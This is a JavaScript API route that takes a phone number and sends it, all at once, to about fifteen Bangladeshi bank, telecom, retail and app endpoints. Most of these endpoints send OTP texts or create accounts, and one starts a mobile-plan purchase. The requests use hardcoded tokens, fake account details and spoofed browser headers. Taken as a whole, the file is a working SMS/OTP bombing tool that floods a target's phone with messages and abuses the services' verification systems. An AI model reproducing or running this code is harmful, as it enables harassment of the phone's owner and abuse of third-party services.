export default async function handler(req, res) {
    if (req.method !== "GET") {
        return res.status(405).json({ error: "Method Not Allowed", methodReceived: req.method });
    }

    const phone = req.query.phone; // Get phone number from URL query

    if (!phone) {
        return res.status(400).json({ error: "Phone number is required" });
    }

    // Define your API calls in an array
    const apis = [
        {
            name: "cineplex",
            url: "https://cineplex-ticket-api.cineplexbd.com/api/v1/otp-resend",
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                r_token: "jycbgygsecsgcfhsgcvysegfgrr46rrgve4urv64iu6",
                msisdn: phone
            })
        },
        {
            name: "dhakaBank",
            url: "https://ezybank.dhakabank.com.bd/VerifIDExt2/api/CustOnBoarding/VerifyMobileNumber",
            headers: {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
            },
            body: JSON.stringify({
                AccessToken: "",
                TrackingNo: "",
                mobileNo: phone,
                otpSms: "",
                product_id: "250",
                requestChannel: "MOB",
                trackingStatus: 5
            })
        },
        {
            name: "deeptoplay",
            url: "https://api.deeptoplay.com/v1/auth/login?country=BD&platform=web",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                number: phone
            })
        },
        {
            name: "easy",
            url: "https://core.easy.com.bd/api/v1/registration",
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
                "Referer": "https://easy.com.bd/",
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                name: "Shahidul Islam",
                email: "uyrlhkgxqw@emergentvillage.org",
                mobile: phone,
                password: "boss#2022",
                password_confirmation: "boss#2022",
                device_key: "9a28ae67c5704e1fcb50a8fc4ghjea4d"
            })
        },
        {
            name: "eonbazar",
            url: "https://app.eonbazar.com/api/auth/register",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                mobile: phone,
                name: "Karim Mia",
                password: "karim2023",
                email: `dghdj${phone}dsgj@gmail.com`
            })
        },
        {
            name: "adpoke",
            url: `http://68.183.88.91/adpoke/cnt/dot/nserve/bd/send/otp?msisdnprefix=880&msisdn=${phone}&token=1693254641407n62562185n33&l=`,
            headers: {
                "Referer": "http://68.183.88.91/",
            }
        },
        {
            name: "grameenphone",
            url: "https://gpwebms.grameenphone.com/api/v1/flexiplan-purchase/activation",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                payment_mode: "mobile_balance",
                longevity: 7,
                voice: 25,
                data: 1536,
                fourg: 0,
                bioscope: 0,
                sms: 0,
                mca: 0,
                msisdn: phone,
                price: 73.34,
                bundle_id: 26571,
                is_login: false
            })
        },
        {
            name: "flipper",
            url: "https://portal.flipper.com.bd/api/v1/send-otp/login",
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
                "X-Authorization": "QoFN68MGTcosJxSmDf5GCgxXlNcgE1mUH9MUWuDHgs7dugjR7P2ziASzpo3frHL3",
                "Origin": "https://flipper.com.bd",
                "Referer": "https://flipper.com.bd/",
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                mobile_number: phone
            })
        },
        {
            name: "freedom",
            url: "https://freedom.fsiblbd.com/verifidext/api/CustOnBoarding/VerifyMobileNumber",
            headers: {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0", // Replace with actual User-Agent
            },
            body: JSON.stringify({
                AccessToken: "",
                TrackingNo: "",
                mobileNo: phone,
                otpSms: "",
                product_id: "122",
                requestChannel: "MOB",
                trackingStatus: 5
            })
        },
        {
            name: "fundesh",
            url: "https://fundesh.com.bd/api/auth/generateOTP?service_key=",
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                msisdn: phone
            })
        },
        {
            name: "ghoorilearning",
            url: "https://api.ghoorilearning.com/api/auth/signup/otp?_app_platform=web&_lang=bn",
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
                "Content-Type": "application/json",
                "Referer": "https://ghoorilearning.com/",
                "Origin": "https://ghoorilearning.com",
            },
            body: JSON.stringify({
                mobile_no: phone
            })
        },
        {
            name: "mygp",
            url: `https://api.mygp.cinematic.mobi/api/v1/otp/88${phone}/SBENT_3GB7D`,
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                accessinfo: {
                    access_token: "K165S6V6q4C6G7H0y9C4f5W7t5YeC6",
                    referenceCode: "20190827042622"
                }
            })
        },
        {
            name: "bkshopthc",
            url: "https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp",
            headers: {
                "Content-Type": "application/json",
                "User-Agent": "Mozilla/5.0 (Linux; Android 8.0.0; SM-G960F Build/R16NW) AppleWebKit/537.36"
            },
            body: JSON.stringify({
                phone: phone,
                email: "",
                language: "en"
            })
        },
        {
            name: "weblogin",
            url: "https://weblogin.grameenphone.com/backend/api/v1/otp",
            headers: {
                "Content-Type": "application/json",
            },
            body: JSON.stringify({
                msisdn: phone
            })
        },
        {
            name: "hishabee",
            url: `https://app.hishabee.business/api/V2/otp/send?mobile_number=${phone}`,
            headers: {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0",
                "Content-Type": "application/json",
                "Content-Length": "0",
            }
        }
    ];

    try {
        // Send requests to all APIs simultaneously
        const responses = await Promise.all(
            apis.map(async (api) => {
                try {
                    const response = await fetch(api.url, {
                        method: api.body ? "POST" : "GET",
                        headers: api.headers,
                        body: api.body
                    });

                    const data = await response.json();
                    return { service: api.name, status: response.status, response: data };
                } catch (error) {
                    return { service: api.name, error: error.message };
                }
            })
        );

        return res.status(200).json({ results: responses });
    } catch (error) {
        return res.status(500).json({ error: "Error processing the request", message: error.message });
    }
}
